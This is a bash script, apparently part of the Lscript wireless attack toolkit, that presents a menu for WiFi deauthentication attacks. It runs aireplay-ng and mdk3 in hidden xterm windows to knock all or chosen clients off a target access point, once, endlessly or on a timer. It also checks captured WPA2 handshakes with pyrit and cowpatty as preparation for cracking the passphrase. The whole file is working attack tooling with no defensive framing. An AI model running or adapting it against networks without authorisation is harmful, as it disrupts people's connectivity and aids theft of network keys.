#! /bin/bash

#############DEFAULTS###############
DPID=$$
echo -e "$DPID" > "$LPATH"/dpid.txt
####################################
printf '\033]2;DEAUTH MENU\a'
k=1
REDEAUTH="n"
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
####################################
printf '\033]2;DEAUTH MENU\a'
REDEAUTH="n"
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
function find_pid
{
j=1
while true
do
	CURPID="dpid"$j".txt"
	FINDPID=$(ls "$LPATH" | grep "$CURPID")
	if [[ "$FINDPID" == "" ]]
	then
		AVPID="$CURPID"
		break
	fi
	j=$((j+1))
done
}
function defaults_lh2
{
#path for lscript
	LPATH="/root/lscript"
	export LPATH
#yellow start 
	YS="\e[1;33m"
#blue start 
	BS="\e[0;34m"
#color end
	CE="\e[0m"
#red start
	RS="\e[1;31m"
#black start
	BLS="\e[0;30m"
#dark gray start
	DGYS="\e[1;30m"
#light blue start
	LBS="\e[1;34m"
#green start
	GNS="\e[0;32m"
#light green start
	LGNS="\e[1;32m"
#cyan start
	CYS="\e[0;36m"
#light cyan start
	LCYS="\e[1;36m"
#light red start
	DRS="\e[0;31m"
#purple start
	PS="\e[0;35m"
#light purple start
	LPS="\e[1;35m"
#brown start
	BRS="\e[0;33m"
#light gray start
	LGYS="\e[0;37m"
#white start
	WHS="\e[1;37m"
#setting frequent stings
	YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
	YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
	YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
	PAKT="Press "$YS"any key$CE to"
	PAKTC="Press "$YS"any key$CE to continue..."
	PAKTGB="Press "$YS"any key$CE to go back..."
	TNI=""$RS"Tool is not installed. To install it type '"$CE""$YS"install"$CE""$RS"'."$CE""
#code to read from keyboard without return
	READAK="read -n 1"
}
function option3
{
while true
do
	#~ echo -e "Searching for clients"
	if [[ ! -f "$HANDFORDEAUTH" ]]
	then
		echo -e ""$RS"Error 2"$CE""
		sleep 2
		break
	fi
	lines=$(cat $HANDFORDEAUTH | awk 'END{print NR}')
	dlines=$((lines-6))
	if [[ "$dlines" -le 0 ]]
	then
		echo -e ""$RS"No clients found (yet)."$CE""
		sleep 2
		break
	fi
	clear
	echo -e "Found $dlines clients."
	sleep 1
	n=1
	while [[ "$n" -le "$dlines" ]]
	do
		n1=$((5+n))
		station[$n]=$(cat $HANDFORDEAUTH | awk -v nn="$n1" '{FS=","}{if(NR==nn)print $1}')
		if [[ "$n" -ge 10 ]]
		then
			echo -e ""$YS""$n""$CE") "${station[$n]}""
		else
			echo -e ""$YS" "$n""$CE") "${station[$n]}""
		fi
		n=$((n+1))
	done
	echo -e ""$YS" a"$CE") Deauth all clients separately"
	echo -e ""$YS" m"$CE") Manually type a MAC to deauth"
	echo -e ""$YS" r"$CE") Refresh"
	echo -e ""$YS" b"$CE") Go back"
	echo -e "Choose: "
	read STATION
	clear
	if [[ "$STATION" = "m" ]]
	then
		echo -e "MAC to deauth: "
		read MACTD
		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
		read DEAUTHS
		if [[ "$DEAUTHS" = "" ]]
		then
			DEAUTHS=0
		fi
		export DEAUTHS
		export TARGB
		export MACTD
		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $MACTD $IGNN $WLANNM && exit; exec bash' & disown
	fi
	if [[ "$STATION" = "r" ]]
	then
		clear
		continue
	fi
	if [[ "$STATION" = "a" ]]
	then
		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
		read DEAUTHS
		if [[ "$DEAUTHS" = "" ]]
		then
			DEAUTHS=0
		fi
		n=1
		while [[ "$n" -le "$dlines" ]]
		do
			DSTATION="${station[$n]}"
			export DEAUTHS
			export TARGB
			export DSTATION
			xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
			n=$((n+1))
		done
	fi
	if [[ "$STATION" = "b" ]]
	then
		break
	fi
	if [[ "$STATION" -le "$dlines" && "$STATION" -ge 1 ]]
	then
		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
		read DEAUTHS
		if [[ "$DEAUTHS" = "" ]]
		then
			DEAUTHS=0
		fi
		DSTATION="${station[$STATION]}"
		export DEAUTHS
		export TARGB
		export DSTATION
		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
	fi
done
}
function pyrit_hand_check
{
	clear
	echo -e "Checking handshake with pyrit..."
	TEMP=$(pyrit -r "$HANDCAP" analyze 2>/dev/null) 
	TEMPHAND=$(echo "$TEMP" | grep "No valid EAOPL-handshake + ESSID detected.")
	clear
	if [[ "$TEMPHAND" = "" ]]
	then
		VALIDH=1
		#TEMPHANDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "good")
		TEMPHANDD=$(echo "$TEMP" | grep "good")
		if [[ "$TEMPHANDD" = "" ]]
		then
			TEMPHAD=$(echo "$TEMP" | grep "workable")
			if [[ "$TEMPHAD" = "" ]]
			then	
				#TEMPHANDDD=$(pyrit -r "$HANDCAP" analyze 2>/dev/null | grep "bad")
				TEMPHANDDD=$(echo "$TEMP" | grep "bad")
				if [[ "TEMPHANDDD" = "" ]]
				then
					echo -e "Handshake found!(Status: "$RS"unknown"$CE")"
				else
					echo -e "Handshake found!(Status: "$RS"bad"$CE")"
				fi
				sleep 2
			else
				echo -e "Handshake found!(Status: "$RS"workable"$CE")"
			fi			
		else
			echo -e "Valid handshake found!(Status: "$YS"good"$CE")"
			sleep 2
		fi
	else
		VALIDH=0
		echo -e ""$RS"No handshake found."$CE""
		sleep 2
	fi
}
function cowpatty_hand_check
{
	clear
	echo -e "Checking handshake with cowpatty..."
	sleep 1
	TEMPHAND=$(cowpatty -c -r "$HANDCAP" | grep "Collected all necessary data to mount crack against WPA2/PSK passphrase.")
	clear
	if [[ "$TEMPHAND" = "" ]]
	then
		VALIDH=0
		echo -e ""$RS"No handshake found"$CE""
		sleep 1
	else
		VALIDH=1
		echo -e ""$YS"Valid handshake found!"$CE""
		sleep 2
	fi
}
defaults_lh2
if [[ -f "$LPATH"/settings/ignorenegativeone.txt ]]
then
	read IGN < ""$LPATH"/settings/ignorenegativeone.txt"
else
	IGN="no"
fi
if [[ "$IGN" = "yes" ]]
then
	IGNN="--ignore-negative-one"
else
	IGNN=""
fi

while true
do
	clear
	echo -e ""$YS" 1"$CE") Deauth all                      aireplay-ng"
	echo -e ""$YS" 2"$CE") Deauth all                      mdk3"
	echo -e ""$YS" 3"$CE") Deauth client/s                 aireplay-ng"
	echo -e ""$YS" 4"$CE") Deauth all periodically         aireplay-ng"
	if [[ "$HANDF" != "deauth" ]]
	then
		#~ if [[ -f "$LPATH"/settings/checkauto.txt ]]
		#~ then
			#~ read checka < "$LPATH"/settings/checkauto.txt
			#~ if [[ "$checka" == 1 ]]
			#~ then
				#~ checkauto="Automatic"
			#~ else
				#~ checkauto=""$RS"Manual"$CE""
			#~ fi
		#~ else
			#~ checkauto=""$RS"Manual"$CE""
		#~ fi				
		echo -e ""$YS" 5"$CE") Check handshake quality" ##          "$YS"$checkauto"$CE""
		echo -e ""$YS" 6"$CE") Autocheck for handshake"
		#echo -e ""$YS" 7"$CE") Empty the file (when big & no handshake)"
	fi
	#~ if [[ "$LASTOPTIONS" != "" ]]
	#~ then
		#~ echo -e ""$YS"ENTER"$CE") Last option"
	#~ fi
	echo -e ""$YS" 0"$CE") Exit"
	read DT
	if [[ "$DT" = 1 ]]
	then
		PER=0
		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
		read -e DEAUTHS
		if [[ -z "$DEAUTHS" ]]
		then
			DEAUTHS=0
		fi
		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit"
		export DEAUTHS
		export TARGB
		find_pid
		export AVPID
		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash' & disown
	elif [[ "$DT" == 4 ]]
	then
		echo -e "Number of deauths per time: "
		read DPT
		if [[ ! "$DPT" -gt 0 ]]
		then
			echo -e ""$RS"Invalid number"$CE""
			sleep 2
			LASTOPTIONS=""
			continue
		fi
		echo -e "Delay in seconds: "
		read DIS
		if [[ ! "$DIS" -gt 0 ]]
		then
			echo -e ""$RS"Invalid number"$CE""
			sleep 2
			LASTOPTIONS=""
			continue
		fi
		export DIS
		export DPT
		clear
		PER=1
		LASTOPTIONS="4"
		find_pid
		export AVPID
		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit' & disown
	elif [[ "$DT" == 5 ]]
	then
		if [[ "$HANDF" != "deauth" ]]
		then
			while true
			do
				clear
				echo -e ""$YS" 1"$CE") Check with pyrit"
				echo -e ""$YS" 2"$CE") Check with cowpatty"
				echo -e ""$YS" b"$CE") Go back"
				echo -e "Choose: "
				read CHW
				if [[ "$CHW" = 1 ]]
				then
					pyrit_hand_check
				elif [[ "$CHW" = 2 ]]
				then
					cowpatty_hand_check
				elif [[ "$CHW" = "b" ]]
				then
					clear
					break
				fi
			done
		fi
#	elif [[ "$DT" == 7 ]]
#	then
#		if [[ "$HANDF" != "deauth" ]]
#		then
#			echo "" > /root/handshakes/"$HANDF"-01* && echo -e "Done"
#		fi
	elif [[ "$DT" == 6 ]]
	then
		if [[ "$HANDF" != "deauth" ]]
		then
			echo -e "Interval in seconds("$YS"Enter"$CE"="$YS"5"$CE"): "
			read Del
			if [[ "$Del" == "" ]]
			then
				Del=5
			fi
			if [[ "$Del" -gt 0 ]]
			then
				export Del
				export HANDCAP
				xterm -geometry 50x20+0+999999 -T "AUTOCHECK FOR HANDSHAKE" -e "lh21" & disown
			else
				echo -e ""$RS"Invalid interval"$CE""
				sleep 2
			fi
		fi
	#~ elif [[ "$DT" == "" ]]
	#~ then
		#~ if [[ "$HANDFORDEAUTH" != "" ]]
		#~ then
			#~ if [[ "$LASTOPTIONS" != "" ]]
			#~ then
				#~ if [[ "$LASTOPTIONS" = 1 ]]
				#~ then
					#~ option3
				#~ elif [[ "$LASTOPTIONS" = 4 ]]
				#~ then
					#~ xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
				#~ else
					#~ xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash" & disown
				#~ fi
			#~ fi
		#~ fi
		#~ sleep 2
	elif [[ "$DT" = 2 ]]
	then
		echo "$TARGB" > /root/mdk3bssid.txt
		LASTOPTIONS="mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC"
		export DEAUTHS
		export TARGB
		find_pid
		export AVPID
		xterm -geometry 90x15+9999+999999 -T "DEAUTHING WITH MDK3" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $LPATH/$AVPID && mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' & disown
	elif [[ "$DT" = 3 ]]
	then
		LASTOPTIONS=1
		option3
	elif [[ "$DT" = 0 ]]
	then
		exit
	fi
done
